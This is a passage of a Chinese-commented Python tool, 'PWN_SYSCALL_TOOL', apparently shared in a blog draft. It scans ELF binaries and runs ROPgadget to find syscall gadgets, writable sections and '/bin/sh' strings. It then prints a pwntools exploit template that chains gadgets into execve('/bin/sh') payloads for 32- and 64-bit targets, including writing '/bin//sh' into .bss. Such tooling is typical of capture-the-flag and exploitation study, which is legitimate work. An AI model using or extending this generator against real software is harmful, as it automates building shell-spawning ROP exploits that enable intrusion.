C_BOLD    = '\033[1m'       # 加粗


def _c(color, text):
    """给文本上色"""
    return f"{color}{text}{C_RESET}"


def _clear_screen():
    """清屏"""
    os.system('cls' if sys.platform == 'win32' else 'clear')


def smart_input(prompt=""):
    """支持 Ctrl+L 清屏的 input"""
    sys.stdout.write(prompt)
    sys.stdout.flush()
    buf = ""
    while True:
        if sys.platform == 'win32':
            import msvcrt
            ch = msvcrt.getwch()
        else:
            import tty, termios
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setraw(fd)
                ch = sys.stdin.read(1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)

        if ch == '\x0c':  # Ctrl+L
            _clear_screen()
            sys.stdout.write(prompt + buf)
            sys.stdout.flush()
        elif ch == '\r' or ch == '\n':  # Enter
            sys.stdout.write('\n')
            return buf
        elif ch == '\x03':  # Ctrl+C
            sys.stdout.write('\n')
            raise KeyboardInterrupt
        elif ch == '\x7f' or ch == '\b':  # Backspace
            if buf:
                buf = buf[:-1]
                sys.stdout.write('\b \b')
                sys.stdout.flush()
        elif ch.isprintable():
            buf += ch
            sys.stdout.write(ch)
            sys.stdout.flush()

from elftools.elf.elffile import ELFFile

# ──────────────────────────────────────────────────────────
#  架构相关 gadget 定义
# ──────────────────────────────────────────────────────────

GADGETS_32 = [
    ("pop eax",                     r"pop eax\s*;\s*ret"),
    ("pop ebx",                     r"pop ebx\s*;\s*ret"),
    ("pop ecx",                     r"pop ecx\s*;\s*ret"),
    ("pop edx",                     r"pop edx\s*;\s*ret"),
    ("pop ecx; pop ebx",            r"pop ecx\s*;\s*pop ebx\s*;\s*ret"),
    ("pop edx; pop ecx; pop ebx",   r"pop edx\s*;\s*pop ecx\s*;\s*pop ebx\s*;\s*ret"),
    ("mov [edx], eax",              r"mov dword ptr \[edx\]\s*,\s*eax\s*;\s*ret"),
    ("mov [ecx], eax",              r"mov dword ptr \[ecx\]\s*,\s*eax\s*;\s*ret"),
    ("mov [ebx], eax",              r"mov dword ptr \[ebx\]\s*,\s*eax\s*;\s*ret"),
    ("int 0x80",                    r"int 0x80"),
    ("pop eax; pop ebx; pop ecx; pop edx",
        r"pop eax\s*;\s*pop ebx\s*;\s*pop ecx\s*;\s*pop edx\s*;\s*ret"),
]

GADGETS_64 = [
    ("pop rax",                     r"pop rax\s*;\s*ret"),
    ("pop rdi",                     r"pop rdi\s*;\s*ret"),
    ("pop rsi",                     r"pop rsi\s*;\s*ret"),
    ("pop rdx",                     r"pop rdx\s*;\s*ret"),
    ("pop rcx",                     r"pop rcx\s*;\s*ret"),
    ("pop r8",                      r"pop r8\s*;\s*ret"),
    ("pop r9",                      r"pop r9\s*;\s*ret"),
    ("pop rsi; pop r15",            r"pop rsi\s*;\s*pop r15\s*;\s*ret"),
    ("pop rdx; pop r12",            r"pop rdx\s*;\s*pop r12\s*;\s*ret"),
    ("pop rdx; pop rbx",            r"pop rdx\s*;\s*pop rbx\s*;\s*ret"),
    ("pop rdx; pop rcx; pop rbx",   r"pop rdx\s*;\s*pop rcx\s*;\s*pop rbx\s*;\s*ret"),
    ("mov [rdx], rax",              r"mov qword ptr \[rdx\]\s*,\s*rax\s*;\s*ret"),
    ("mov [rsi], rax",              r"mov qword ptr \[rsi\]\s*,\s*rax\s*;\s*ret"),
    ("mov [rdi], rax",              r"mov qword ptr \[rdi\]\s*,\s*rax\s*;\s*ret"),
    ("mov [rcx], rax",              r"mov qword ptr \[rcx\]\s*,\s*rax\s*;\s*ret"),
    ("syscall",                     r"syscall"),
    ("pop rax; pop rdi; pop rsi; pop rdx",
        r"pop rax\s*;\s*pop rdi\s*;\s*pop rsi\s*;\s*pop rdx\s*;\s*ret"),
]

ARCH_CONFIG = {
    'i386': {
        'gadgets': GADGETS_32,
        'ropfilter': 'pop|ret|int|mov',
        'ptr_size': 4,
        'key_gadgets': [
            'pop eax', 'pop ebx', 'pop ecx', 'pop edx',
            'pop ecx; pop ebx', 'pop edx; pop ecx; pop ebx',
            'mov [edx], eax', 'mov [ecx], eax', 'mov [ebx], eax',
            'int 0x80', 'pop eax; pop ebx; pop ecx; pop edx',
        ],
        'template_vars': [
            ('pop_eax',         'pop eax',                    'pop eax ; ret'),
            ('pop_ebx',         'pop ebx',                    'pop ebx ; ret'),
            ('pop_ecx',         'pop ecx',                    'pop ecx ; ret'),
            ('pop_edx',         'pop edx',                    'pop edx ; ret'),
            ('pop_ecx_ebx',     'pop ecx; pop ebx',           'pop ecx ; pop ebx ; ret'),
            ('pop_edx_ecx_ebx', 'pop edx; pop ecx; pop ebx',  'pop edx ; pop ecx ; pop ebx ; ret'),
            ('mov_edx_eax',     'mov [edx], eax',             'mov [edx], eax ; ret'),
            ('mov_ecx_eax',     'mov [ecx], eax',             'mov [ecx], eax ; ret'),
            ('mov_ebx_eax',     'mov [ebx], eax',             'mov [ebx], eax ; ret'),
            ('int_0x80',        'int 0x80',                   'int 0x80'),
        ],
    },
    'amd64': {
        'gadgets': GADGETS_64,
        'ropfilter': 'pop|ret|syscall|mov',
        'ptr_size': 8,
        'key_gadgets': [
            'pop rax', 'pop rdi', 'pop rsi', 'pop rdx',
            'pop rcx', 'pop r8', 'pop r9',
            'pop rsi; pop r15', 'pop rdx; pop r12',
            'pop rdx; pop rbx', 'pop rdx; pop rcx; pop rbx',
            'mov [rdx], rax', 'mov [rsi], rax',
            'mov [rdi], rax', 'mov [rcx], rax',
            'syscall', 'pop rax; pop rdi; pop rsi; pop rdx',
        ],
        'template_vars': [
            ('pop_rax',         'pop rax',                    'pop rax ; ret'),
            ('pop_rdi',         'pop rdi',                    'pop rdi ; ret'),
            ('pop_rsi',         'pop rsi',                    'pop rsi ; ret'),
            ('pop_rdx',         'pop rdx',                    'pop rdx ; ret'),
            ('pop_rcx',         'pop rcx',                    'pop rcx ; ret'),
            ('pop_r8',          'pop r8',                     'pop r8 ; ret'),
            ('pop_r9',          'pop r9',                     'pop r9 ; ret'),
            ('pop_rsi_r15',     'pop rsi; pop r15',           'pop rsi ; pop r15 ; ret'),
            ('pop_rdx_r12',     'pop rdx; pop r12',           'pop rdx ; pop r12 ; ret'),
            ('pop_rdx_rbx',     'pop rdx; pop rbx',           'pop rdx ; pop rbx ; ret'),
            ('pop_rdx_rcx_rbx', 'pop rdx; pop rcx; pop rbx',  'pop rdx ; pop rcx ; pop rbx ; ret'),
            ('mov_rdx_rax',     'mov [rdx], rax',             'mov [rdx], rax ; ret'),
            ('mov_rsi_rax',     'mov [rsi], rax',             'mov [rsi], rax ; ret'),
            ('mov_rdi_rax',     'mov [rdi], rax',             'mov [rdi], rax ; ret'),
            ('mov_rcx_rax',     'mov [rcx], rax',             'mov [rcx], rax ; ret'),
            ('syscall',         'syscall',                    'syscall'),
        ],
    },
}

SYSCALL_NUMS = {
    'i386': {
        'read': 3, 'write': 4, 'open': 5, 'close': 6,
        'execve': 11, 'mmap': 192, 'mprotect': 125,
    },
    'amd64': {
        'read': 0, 'write': 1, 'open': 2, 'close': 3,
        'execve': 59, 'mmap': 9, 'mprotect': 10,
    },
}


# ──────────────────────────────────────────────────────────
#  工具函数
# ──────────────────────────────────────────────────────────

def is_elf(filepath):
    """快速判断文件是否是 ELF"""
    try:
        with open(filepath, 'rb') as f:
            return f.read(4) == b'\x7fELF'
    except (OSError, PermissionError):
        return False


def detect_arch(binary):
    with open(binary, 'rb') as f:
        elf = ELFFile(f)
        machine = elf.header['e_machine']
        if machine == 'EM_386':
            return 'i386'
        elif machine == 'EM_X86_64':
            return 'amd64'
        else:
            return None


def file_size_str(filepath):
    """返回人类可读的文件大小"""
    try:
        sz = os.path.getsize(filepath)
        if sz < 1024:
            return f"{sz}B"
        elif sz < 1024 * 1024:
            return f"{sz/1024:.1f}K"
        else:
            return f"{sz/1024/1024:.1f}M"
    except OSError:
        return "?"


def scan_binaries(directory):
    """扫描目录下的 ELF 可执行文件"""
    results = []
    try:
        entries = sorted(os.listdir(directory))
    except OSError:
        return results

    for name in entries:
        path = os.path.join(directory, name)
        if not os.path.isfile(path):
            continue
        if is_elf(path):
            arch = detect_arch(path)
            if arch:
                arch_tag = "i386" if arch == "i386" else "x64 "
                sz = file_size_str(path)
                results.append((path, name, arch_tag, sz))
    return results


# ──────────────────────────────────────────────────────────
#  菜单交互
# ──────────────────────────────────────────────────────────

def _display_width(s):
    """计算字符串的终端显示宽度 (中文算2, ASCII算1)"""
    w = 0
    for ch in s:
        if '一' <= ch <= '鿿' or '　' <= ch <= '〿' or '＀' <= ch <= '￯':
            w += 2
        else:
            w += 1
    return w


def _box_line(content, width):
    """生成一行 box 内容, 自动对齐中文宽度"""
    pad = width - _display_width(content)
    return f"║{content}{' ' * pad}║"


def print_banner():
    print()
    print(" ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ")
    print(" ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗")
    print(" ███████║███████║██║     █████╔╝ █████╗  ██║  ██║")
    print(" ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║")
    print(" ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝")
    print(" ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝")
    print(f"{'PWN_SYSCALL_TOOL v1.0':>52}")
    print()


def _menu_line(text, width):
    """生成菜单框的一行, text 可含中文"""
    pad = width - _display_width(text)
    return f"│{text}{' ' * pad}│"


def select_binary():
    """交互式选择二进制文件, 返回文件路径或 None"""
    W = 46  # 菜单框内部显示宽度
    top_title = "─ 选择目标 "
    dashes_fill = "─" * (W - _display_width(top_title))
    while True:
        print()
        print(f"    ┌{top_title}{dashes_fill}┐")
        print(f"    │{' ' * W}│")
        print(f"    {_menu_line('  [1] 扫描当前目录', W)}")
        print(f"    {_menu_line('  [2] 手动输入路径', W)}")
        print(f"    {_menu_line('  [3] 扫描指定目录', W)}")
        print(f"    {_menu_line('  [0] 退出', W)}")
        print(f"    │{' ' * W}│")
        print(f"    └{'─' * W}┘")

        choice = smart_input("\n  请选择 > ").strip()

        if choice == '0':
            return None

        elif choice == '1':
            directory = os.getcwd()
            print(f"\n  扫描目录: {directory}\n")
            binaries = scan_binaries(directory)
            return pick_from_list(binaries, directory)

        elif choice == '2':
            path = smart_input("\n  请输入文件路径: ").strip().strip('"').strip("'")
            if not path:
                print("  [!] 路径为空")
                continue
            if not os.path.isfile(path):
                print(f"  [!] 文件不存在: {path}")
                continue
            if not is_elf(path):
                print(f"  [!] 不是 ELF 文件: {path}")
                continue
            return path

        elif choice == '3':
            directory = smart_input("\n  请输入目录路径: ").strip().strip('"').strip("'")
            if not directory:
                directory = os.getcwd()
            if not os.path.isdir(directory):
                print(f"  [!] 目录不存在: {directory}")
                continue
            print(f"\n  扫描目录: {directory}\n")
            binaries = scan_binaries(directory)
            return pick_from_list(binaries, directory)

        else:
            print("  [!] 无效选择")


def pick_from_list(binaries, directory):
    """从扫描结果列表中选择"""
    if not binaries:
        print("  [!] 未找到任何 ELF 可执行文件")
        return None

    print(f"  {'#':<4s} {'架构':<6s} {'大小':<8s} {'文件名'}")
    print(f"  {'─'*4} {'─'*6} {'─'*8} {'─'*30}")
    for i, (path, name, arch_tag, sz) in enumerate(binaries, 1):
        print(f"  {i:<4d} {arch_tag:<6s} {sz:<8s} {name}")

    print(f"\n  输入序号选择 (0=返回): ")
    sel = smart_input("  > ").strip()

    if sel == '0' or sel == '':
        return None

    try:
        idx = int(sel) - 1
        if 0 <= idx < len(binaries):
            return binaries[idx][0]
        else:
            print(f"  [!] 无效序号: {sel}")
            return None
    except ValueError:
        print(f"  [!] 请输入数字")
        return None


# ──────────────────────────────────────────────────────────
#  分析函数
# ──────────────────────────────────────────────────────────

def run_ropgadget(binary, ropfilter):
    # 尝试多种方式找到 ROPgadget
    candidates = []
    if sys.platform == 'win32':
        # Windows: Scripts 目录下的脚本
        for scripts_dir in [
            os.path.join(os.path.dirname(sys.executable), 'Scripts'),
            os.path.join(sys.prefix, 'Scripts'),
        ]:
            p = os.path.join(scripts_dir, 'ROPgadget')
            if os.path.exists(p):
                candidates.append([sys.executable, p])
    # 通用: 直接调用
    candidates.append(["ROPgadget"])
    # 通用: python -m
    candidates.append([sys.executable, "-m", "ROPgadget"])

    for cmd_base in candidates:
        cmd = cmd_base + ["--binary", binary, "--only", ropfilter]
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=60)
            stdout = result.stdout.decode('utf-8', errors='replace')
            if stdout.strip() and "Gadgets information" in stdout:
                return stdout
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            continue

    # 全部失败, 打印诊断信息
    print("    [!] ROPgadget 调用失败, 请确认已安装: pip install ROPgadget")
    return None


def parse_gadgets(output):
    lines = []
    for line in output.strip().splitlines():
        m = re.match(r"(0x[0-9a-fA-F]+)\s*:\s*(.+)", line)
        if m:
            lines.append((m.group(1), m.group(2).strip()))
    return lines


def find_gadgets(binary, arch):
    config = ARCH_CONFIG[arch]
    output = run_ropgadget(binary, config['ropfilter'])
    if output is None:
        return {}
    gadget_lines = parse_gadgets(output)
    found = {}
    for name, pattern in config['gadgets']:
        for addr, asm in gadget_lines:
            if re.search(pattern, asm, re.IGNORECASE):
                found[name] = (addr, asm)
                break
    return found


def find_writable_sections(binary):
    writable = {}
    with open(binary, "rb") as f:
        elf = ELFFile(f)
        for section in elf.iter_sections():
            name = section.name
            if name in ('.bss', '.data', '.got', '.got.plt'):
                addr = section['sh_addr']
                size = section['sh_size']
                if size > 0:
                    writable[name] = {'addr': addr, 'size': size, 'end': addr + size}
    return writable


def find_binsh(binary):
    results = {}
    targets = {'/bin/sh': b'/bin/sh\x00', '/bin/bash': b'/bin/bash\x00'}
    with open(binary, "rb") as f:
        data = f.read()
    for name, pattern in targets.items():
        offset = 0
        found_list = []
        while True:
            idx = data.find(pattern, offset)
            if idx == -1:
                break
            found_list.append(idx)
            offset = idx + 1
        if found_list:
            results[name] = found_list
    return results, data


def vaddr_from_offset(binary, file_offset):
    with open(binary, "rb") as f:
        elf = ELFFile(f)
        for segment in elf.iter_segments():
            if segment['p_type'] != 'PT_LOAD':
                continue
            f_off = segment['p_offset']
            vaddr = segment['p_vaddr']
            filesz = segment['p_filesz']
            if f_off <= file_offset < f_off + filesz:
                return vaddr + (file_offset - f_off)
    return None


# ──────────────────────────────────────────────────────────
#  分析 & 输出
# ──────────────────────────────────────────────────────────

def analyze(binary):
    """对选定的二进制执行完整分析"""
    arch = detect_arch(binary)
    if arch is None:
        print("  [!] 无法识别架构")
        return

    config = ARCH_CONFIG[arch]
    basename = os.path.basename(binary)

    arch_str = f"{arch} ({'32-bit' if arch == 'i386' else '64-bit'})"
    W = 48
    line1 = f"  目标: {_c(C_GREEN, basename)}"
    line2 = f"  架构: {_c(C_CYAN, arch_str)}"
    # 颜色码不占显示宽度, pad 按无色文本计算
    plain1 = f"  目标: {basename}"
    plain2 = f"  架构: {arch_str}"
    pad1 = W - _display_width(plain1)
    pad2 = W - _display_width(plain2)
    print()
    print(f"    {_c(C_CYAN, '┌')}{'─' * W}{_c(C_CYAN, '┐')}")
    print(f"    {_c(C_CYAN, '│')}{line1}{' ' * pad1}{_c(C_CYAN, '│')}")
    print(f"    {_c(C_CYAN, '│')}{line2}{' ' * pad2}{_c(C_CYAN, '│')}")
    print(f"    {_c(C_CYAN, '└')}{'─' * W}{_c(C_CYAN, '┘')}")

    # ── Gadget ────────────────────────────────────────────
    print(f"\n  {_c(C_BOLD, '[*]')} 搜索 syscall gadget ...\n")
    gadgets = find_gadgets(binary, arch)

    for name in config['key_gadgets']:
        if name in gadgets:
            addr, asm = gadgets[name]
            print(f"    {_c(C_GREEN, '[+]')} {name:<40s} {_c(C_GREEN, addr)}  ({_c(C_YELLOW, asm)})")
        else:
            print(f"    {_c(C_RED, '[-]')} {name:<40s} {_c(C_RED, '未找到')}")

    # ── 可写段 ────────────────────────────────────────────
    print(f"\n  {_c(C_BOLD, '[*]')} 可写段 (全局变量) ...\n")
    writable = find_writable_sections(binary)
    data_buf_candidates = []
    for sec_name, info in sorted(writable.items(), key=lambda x: x[1]['addr']):
        print(f"    {_c(C_GREEN, '[+]')} {_c(C_CYAN, sec_name):<22s} "
              f"addr={_c(C_GREEN, hex(info['addr']))}  "
              f"size={hex(info['size'])}  end={hex(info['end'])}")
        if sec_name in ('.bss', '.data'):
            data_buf_candidates.append(info['addr'])

    if data_buf_candidates:
        print(f"\n    {_c(C_MAGENTA, '>>>')} 推荐 data_buf: {_c(C_MAGENTA, ' / '.join(hex(a) for a in data_buf_candidates))}")

    # ── /bin/sh ───────────────────────────────────────────
    print(f"\n  [*] 搜索 /bin/sh ...\n")
    binsh_results, data = find_binsh(binary)
    binsh_vaddr = None

    if '/bin/sh' in binsh_results:
        for offset in binsh_results['/bin/sh']:
            vaddr = vaddr_from_offset(binary, offset)
            if vaddr:
                print(f"    {_c(C_GREEN, '[+]')} /bin/sh  文件偏移={_c(C_GREEN, hex(offset))}  虚拟地址={_c(C_GREEN, hex(vaddr))}")
                binsh_vaddr = vaddr
            else:
                print(f"    {_c(C_GREEN, '[+]')} /bin/sh  文件偏移={_c(C_GREEN, hex(offset))}")
    elif '/bin/bash' in binsh_results:
        for offset in binsh_results['/bin/bash']:
            vaddr = vaddr_from_offset(binary, offset)
            if vaddr:
                print(f"    {_c(C_GREEN, '[+]')} /bin/bash  文件偏移={_c(C_GREEN, hex(offset))}  虚拟地址={_c(C_GREEN, hex(vaddr))}")
                binsh_vaddr = vaddr
            else:
                print(f"    {_c(C_GREEN, '[+]')} /bin/bash  文件偏移={_c(C_GREEN, hex(offset))}")
    else:
        print(f"    {_c(C_RED, '[-]')} 并没有纯净的 /bin/sh")
        if arch == 'i386':
            print(f"        需要 {_c(C_YELLOW, 'mov [edx], eax')} 手动写入 \"/bin\" + \"/sh\\0\"")
        else:
            print(f"        需要 {_c(C_YELLOW, 'mov [rdx], rax')} 手动写入 \"/bin//sh\" (8字节对齐)")

    # ── exploit 模板 ──────────────────────────────────────
    print(f"\n    {_c(C_CYAN, '┌')}─ {_c(C_BOLD, f'exploit.py 模板 ({arch})')} {'─' * (25 - len(arch))}{_c(C_CYAN, '┐')}\n")

    ctx_line = f"context(os='linux', arch='{arch}')"
    print(f"    {_c(C_YELLOW, 'from pwn import *')}")
    print(f"    {_c(C_YELLOW, ctx_line)}")
    print()

    for var_name, gadget_key, comment in config['template_vars']:
        if gadget_key in gadgets:
            addr, _ = gadgets[gadget_key]
            print(f"    {var_name:<16s} = {_c(C_GREEN, addr)}   # {comment}")
        else:
            print(f"    {var_name:<16s} = {_c(C_RED, '???')}       # {comment}  {_c(C_RED, '[未找到]')}")

    if data_buf_candidates:
        print(f"    {'data_buf':<16s} = {_c(C_MAGENTA, hex(data_buf_candidates[0]))}   # .bss 可写缓冲区")
    if binsh_vaddr:
        print(f"    {'binsh':<16s} = {_c(C_MAGENTA, hex(binsh_vaddr))}   # \"/bin/sh\"")

    print()
    cc = C_CYAN  # 注释颜色
    if arch == 'i386':
        print(f"    {_c(cc, '#')} execve(\"/bin/sh\", 0, 0)  =>  eax=0xb, ebx=binsh, ecx=0, edx=0")
        print(f"    {_c(cc, '#')} payload += p32(pop_eax) + p32(0xb)")
        print(f"    {_c(cc, '#')} payload += p32(pop_ecx_ebx) + p32(0) + p32(binsh)")
        print(f"    {_c(cc, '#')} payload += p32(pop_edx) + p32(0)")
        print(f"    {_c(cc, '#')} payload += p32(int_0x80)")
        print()
        print(f"    {_c(cc, '#')} 无 /bin/sh 时手动写入:")
        print(f"    {_c(cc, '#')} payload += p32(pop_eax) + p32({_c(C_GREEN, '0x6e69622f')})  \"/bin\"")
        print(f"    {_c(cc, '#')} payload += p32(pop_edx) + p32(data_buf)")
        print(f"    {_c(cc, '#')} payload += p32(mov_edx_eax)")
        print(f"    {_c(cc, '#')} payload += p32(pop_eax) + p32({_c(C_GREEN, '0x0068732f')})  \"/sh\\0\"")
        print(f"    {_c(cc, '#')} payload += p32(pop_edx) + p32(data_buf + 4)")
        print(f"    {_c(cc, '#')} payload += p32(mov_edx_eax)")
    else:
        print(f"    {_c(cc, '#')} execve(\"/bin/sh\", 0, 0)  =>  rax=0x3b, rdi=binsh, rsi=0, rdx=0")
        print(f"    {_c(cc, '#')} payload += p64(pop_rax) + p64(0x3b)")
        print(f"    {_c(cc, '#')} payload += p64(pop_rdi) + p64(binsh)")
        print(f"    {_c(cc, '#')} payload += p64(pop_rsi) + p64(0)")
        print(f"    {_c(cc, '#')} payload += p64(pop_rdx) + p64(0)")
        print(f"    {_c(cc, '#')} payload += p64(syscall)")
        print()
        print(f"    {_c(cc, '#')} 无 /bin/sh 时手动写入 (8字节对齐):")
        print(f"    {_c(cc, '#')} payload += p64(pop_rax) + p64({_c(C_GREEN, '0x68732f2f6e69622f')})  \"/bin//sh\"")
        print(f"    {_c(cc, '#')} payload += p64(pop_rdx) + p64(data_buf)")
        print(f"    {_c(cc, '#')} payload += p64(mov_rdx_rax)")

    print()


# ──────────────────────────────────────────────────────────
#  主循环
# ──────────────────────────────────────────────────────────

def main():
    _clear_screen()
    try:
        while True:
            print_banner()
            binary = select_binary()
            if binary is None:
                print("\n  再见!\n")
                break

            analyze(binary)

            print(f"  {'─'*56}")
            cont = smart_input("  按 Enter 继续选择, 输入 q 退出 > ").strip().lower()
            if cont == 'q':
                print("\n  再见!\n")
                break
    except KeyboardInterrupt:
        print("\n\n  再见!\n")


if __name__ == "__main__":
    main()

```

```md wrap
<!-- 你可以在此处书写大纲，并在上方完成文章 -->
```
